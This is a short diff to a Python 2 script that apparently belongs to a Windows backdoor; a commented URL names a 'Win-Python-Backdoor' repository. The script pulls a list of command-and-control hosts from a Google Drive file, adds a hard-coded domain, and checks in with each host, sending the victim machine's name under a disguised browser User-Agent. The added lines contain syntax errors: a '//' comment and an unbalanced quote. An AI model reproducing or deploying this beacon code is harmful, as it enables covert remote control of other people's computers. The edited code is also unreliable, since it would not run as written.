@@ -13,9 +13,10 @@ from uuid import getnode as get_mac
 import socket
 
 #mainsite = urllib2.urlopen("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt")
-mainsite = urllib2.urlopen("https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF")
+#mainsite = urllib2.urlopen("https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF")
+mainsite = urllib2.urlopen("https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny")
 #print mainsite.text
-sites = ["paner.altervista.org"]#, mainsite.text]
+sites = ["https://paner.altervista.org"]#, mainsite.text]
 sites.extend(mainsite.read().split(",") )
 
 
@@ -43,7 +44,8 @@ for site in sites:
     #httpServ.request('GET', "/svc/wup.php?pc="+name)
     #response = httpServ.getresponse()
     print "http://"+site+"/svc/wup.php?pc="+name
-    request = urllib2.Request("http://"+site+"/svc/wup.php?pc="+name, headers={'User-Agent': 'Mozilla/5.0'})
+    //request = urllib2.Request("http://"+site+"/svc/wup.php?pc="+name, headers={'User-Agent': 'Mozilla/5.0'})
+    request = urllib2.Request("site+"/svc/wup.php?pc="+name, headers={'User-Agent': 'Mozilla/5.0'})
     response = urllib2.urlopen(request)
     #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name)
     sresponse = response.read()
